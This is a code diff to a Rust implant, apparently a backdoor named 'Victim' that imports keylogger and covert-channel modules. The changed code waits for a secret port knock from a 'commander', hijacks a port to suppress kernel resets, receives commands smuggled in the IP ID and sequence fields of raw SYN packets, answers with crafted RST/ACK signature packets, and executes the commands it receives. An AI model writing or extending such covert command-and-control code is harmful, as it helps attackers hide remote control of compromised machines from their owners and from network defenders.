@@ -8,7 +8,7 @@ use pnet::packet::Packet;
 use pnet::transport::{transport_channel, TransportChannelType::Layer3, TransportSender, TransportReceiver};
 use pnet::packet::ip::IpNextHeaderProtocols;
 use pnet::datalink::{self, NetworkInterface};
-
+use std::net::TcpListener;
 mod keylogger;
 mod covert;
 mod port_knkr;
@@ -79,9 +79,23 @@ impl Victim {
     }
 
     pub fn run(&mut self) {
+        // 1. Wait for the secret knock to get the ports
         let (commander_ip, my_port, cmd_port) = self.wait_for_commander();
+        
+        // 2. Hijack the port immediately after learning what it is
+        // We bind to 'my_port' because that's where the Commander sends the SYN data
+        let _hijacker = TcpListener::bind(format!("0.0.0.0:{}", my_port));
+        
+        match _hijacker {
+            Ok(_) => println!("[*] Port {} hijacked. Kernel RSTs suppressed.", my_port),
+            Err(e) => println!("[!] Warning: Could not hijack port {}: {}. You might need iptables.", my_port, e),
+        }
+
+        // 3. Start the Raw Socket channels
         let protocol = Layer3(IpNextHeaderProtocols::Tcp);
         let (tx, rx) = transport_channel(65535, protocol).expect("Root required");
+        
+        // 4. Enter the loop (hijacker stays alive because it's in this scope)
         self.main_loop(tx, rx, commander_ip, my_port, cmd_port);
     }
 
@@ -98,28 +112,36 @@ impl Victim {
             }
 
             if let Ok((packet, _)) = rx_iter.next() {
-                if packet.get_source() == commander_ip {
-                    if let Some(parsed) = covert::parse_syn_from_ipv4_packet(packet.packet()) {
-                        if parsed.dst_port == my_port {
-                            if let Ok((_, sig_id)) = receiver_state.apply_chunk(parsed.ip_id, parsed.seq) {
-                                // ACK chunk
-                                let rst_params = covert::RstAckParams {
-                                    src_ip: self.local_ip,
-                                    dst_ip: commander_ip,
-                                    src_port: my_port,
-                                    dst_port: parsed.src_port,
-                                    ack_number: parsed.seq.wrapping_add(1),
-                                    ip_id: sig_id,
-                                };
-                                let rst_pkt = covert::build_rst_ack_packet(&rst_params);
-                                let _ = tx.send_to(pnet::packet::ipv4::Ipv4Packet::new(&rst_pkt).unwrap(), IpAddr::V4(commander_ip));
+                // Ignore packets not from our commander
+                if packet.get_source() != commander_ip { continue; }
 
-                                if receiver_state.complete {
-                                    if let Ok(cmd_str) = receiver_state.message_str() {
-                                        self.handle_command(&cmd_str, &mut tx, commander_ip, my_port, cmd_port);
-                                    }
-                                    receiver_state = covert::ReceiverState::new();
+                if let Some(parsed) = covert::parse_syn_from_ipv4_packet(packet.packet()) {
+                    if parsed.dst_port == my_port {
+                        // Apply chunk and get the signature to send back
+                        if let Ok((_, sig_id)) = receiver_state.apply_chunk(parsed.ip_id, parsed.seq) {
+                            
+                            // Craft the custom RST/ACK with the mathematical signature
+                            let rst_params = covert::RstAckParams {
+                                src_ip: self.local_ip,
+                                dst_ip: commander_ip,
+                                src_port: my_port,
+                                dst_port: parsed.src_port,
+                                ack_number: parsed.seq.wrapping_add(1),
+                                ip_id: sig_id, // This is the signature Commander is waiting for
+                            };
+
+                            let rst_pkt = covert::build_rst_ack_packet(&rst_params);
+                            let _ = tx.send_to(
+                                pnet::packet::ipv4::Ipv4Packet::new(&rst_pkt).unwrap(), 
+                                IpAddr::V4(commander_ip)
+                            );
+
+                            if receiver_state.complete {
+                                if let Ok(cmd_str) = receiver_state.message_str() {
+                                    println!("[*] Executing Command: {}", cmd_str);
+                                    self.handle_command(&cmd_str, &mut tx, commander_ip, my_port, cmd_port);
                                 }
+                                receiver_state = covert::ReceiverState::new();
                             }
                         }
                     }
